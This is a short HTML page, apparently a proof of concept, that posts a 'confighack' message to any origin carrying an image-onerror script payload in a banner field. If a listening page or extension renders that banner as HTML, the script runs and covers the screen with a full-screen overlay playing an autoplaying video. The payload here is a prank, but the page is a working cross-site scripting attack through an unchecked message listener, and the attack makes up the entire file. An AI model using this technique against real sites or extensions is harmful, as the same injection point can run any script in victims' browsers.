<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Hackerman website</title>
</head>

<body>
  <h1>Lets goooooooooooo</h1>
  <p></p>

  <script>
    {
      window.postMessage({
        type: "confighack",
        config: {
          showBanner: `
          <img src="x" onerror="
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#000;display:flex;align-items:center;justify-content:center';

            const iframe = document.createElement('iframe');
            iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1';
            iframe.style.cssText = 'width:80vw;height:80vh;border:none';
            iframe.allow = 'autoplay; encrypted-media';

            overlay.appendChild(iframe);
            document.body.appendChild(overlay);
          ">
        `
        }
      }, "*");
    };
  </script>
</body>

</html>
